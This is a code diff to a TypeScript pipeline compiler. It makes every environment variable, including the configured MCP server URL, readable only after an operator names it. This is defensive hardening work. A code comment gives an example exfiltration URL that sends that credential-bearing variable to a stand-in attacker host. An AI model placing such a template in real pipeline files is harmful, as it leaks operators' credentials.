@@ -221,9 +221,13 @@ function emitPythonSink(sink: PipelineSink): string {
 // ${env.NAME}. Keep this in lockstep with resolveTemplate below.
 const ENV_READ_RX = /\$\{env\.([A-Za-z_][A-Za-z0-9_]*)\}/g;
 
-// HOLOSCRIPT_MCP_URL is the configured MCP server and is always readable without a
-// flag (matches the server-origin policy in parser/PipelineServerPolicy.ts).
-const ALWAYS_ALLOWED_ENV = 'HOLOSCRIPT_MCP_URL';
+// No variable is readable without the operator naming it, HOLOSCRIPT_MCP_URL included.
+// It is the configured MCP server and can carry a credential or a tunnel token, so a file
+// that could read it in an endpoint could send it to a host the file chose, e.g.
+// https://evil.example/?u=${env.HOLOSCRIPT_MCP_URL}. Its one free use is an MCP stage's
+// `server` value: parser/PipelineServerPolicy.ts refuses every ${...} there except the
+// configured-server form, and this emitter never reads a server value from the environment.
+// So pipelineIo below does not scan server values, and a server value asks for no flag.
 
 /** Collect the ${env.NAME} reads from one string. */
 function envNamesIn(value: string | undefined): string[] {
@@ -328,7 +332,8 @@ export function compilePipelineToNode(
  *
  * Each ${'${env.NAME}'} the pipeline reads must be allowed by the operator at run time
  * (holoscript run --allow-env NAME, or HOLOSCRIPT_PIPELINE_ALLOW_ENV=NAME,NAME).
- * HOLOSCRIPT_MCP_URL is always allowed. (Board task task_1791176003202_obsc.)
+ * No variable is readable without being named, HOLOSCRIPT_MCP_URL included. (Board task
+ * task_1791176003202_obsc.)
  */
 
 import fs from 'node:fs/promises';
@@ -341,13 +346,10 @@ const RUN_DATE = new Date().toISOString().slice(0, 10);
 const PIPELINE_ENV_READS = ${JSON.stringify(io.envReads)};
 const PIPELINE_REQUEST_HOSTS = ${JSON.stringify(io.hosts)};
 const PIPELINE_HOST_FROM_ENV = ${JSON.stringify(io.dynamicHost)};
-const PIPELINE_ALWAYS_ALLOWED_ENV = ${JSON.stringify(ALWAYS_ALLOWED_ENV)};
 
 function pipelineAllowedEnv() {
   const raw = process.env.HOLOSCRIPT_PIPELINE_ALLOW_ENV || '';
-  const set = new Set(raw.split(',').map((s) => s.trim()).filter(Boolean));
-  set.add(PIPELINE_ALWAYS_ALLOWED_ENV);
-  return set;
+  return new Set(raw.split(',').map((s) => s.trim()).filter(Boolean));
 }
 
 // Printed once at run start so an operator can see what the pipeline will read and
@@ -375,9 +377,7 @@ function assertPipelineEnvAllowed() {
       flags +
       '  (one per variable), or set HOLOSCRIPT_PIPELINE_ALLOW_ENV=' +
       denied.join(',') +
-      '. Only ' +
-      PIPELINE_ALWAYS_ALLOWED_ENV +
-      ' is readable without a flag.'
+      '. No variable is readable without being named.'
   );
 }
 
